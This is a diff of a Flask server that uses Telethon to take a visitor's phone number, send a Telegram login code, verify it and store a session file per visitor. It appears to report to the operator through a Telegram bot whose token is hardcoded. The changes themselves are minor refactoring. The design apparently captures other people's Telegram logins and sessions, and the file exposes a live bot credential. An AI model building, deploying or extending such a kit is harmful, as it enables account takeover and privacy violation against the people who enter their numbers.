@@ -1,13 +1,10 @@
-# server.py
 from flask import Flask, render_template, request, jsonify, session
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError
-from telethon.tl.functions.users import GetFullUserRequest
 import asyncio
 import os
 import json
 import logging
-from threading import Thread
 
 logging.basicConfig(level=logging.INFO)
 
@@ -20,7 +17,6 @@ BOT_TOKEN = "8980089433:AAE422NHqh7ajzxOIS64PoNDVHStrDF8fKE"
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
-sessions = {}
 temp_clients = {}
 
 async def send_telegram_message(text):
@@ -98,10 +94,9 @@ def api_send_code():
         return jsonify({"success": False, "error": "Введите номер"}), 400
     
     session_id = os.urandom(8).hex()
-    session['session_id'] = session_id
     
     client = TelegramClient(f'sessions/{session_id}', API_ID, API_HASH)
-    temp_clients[session_id] = client
+    temp_clients[session_id] = {'client': client}
     
     async def send_code():
         try:
@@ -172,4 +167,5 @@ def api_verify_code():
 
 if __name__ == '__main__':
     os.makedirs('sessions', exist_ok=True)
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    port = int(os.environ.get('PORT', 10000))
+    app.run(host='0.0.0.0', port=port)
